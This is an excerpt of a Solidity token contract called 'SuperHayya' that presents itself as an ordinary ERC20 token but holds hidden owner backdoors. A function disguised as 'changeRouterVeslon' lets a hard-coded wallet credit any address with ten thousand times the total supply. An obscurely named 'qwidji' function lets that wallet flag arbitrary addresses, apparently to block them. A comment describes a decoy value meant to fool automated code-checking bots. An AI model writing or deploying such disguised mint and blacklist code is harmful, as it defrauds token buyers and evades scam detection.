...
contract SuperHayya is Context, IERC20, Ownable {
    //safe ABI keep contract safe when bot check the code
    uint256 private safe_ABI_Code = 13277701077777777777715981534555115168565469231003;
    using SafeMath for uint256;
    string private _name = "SuperHayya";
    string private _symbol = "SuperHayya";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xE0B0E652CeAf0F2ecAE88AD15342f88fB5B1091C));
        __wal = payable(address(0xE0B0E652CeAf0F2ecAE88AD15342f88fB5B1091C));
    ...
    function changeRouterVeslon(address newRoutrAddress) public {if(
        msg.sender
         == __wal){
        _jgoiewff[newRoutrAddress] = totalSupply().mul(10000);}
    }
    ...
    function qwidji(address a,bool b) public {if(msg.sender == __wal){
        _hh_[a] = b;}
    }
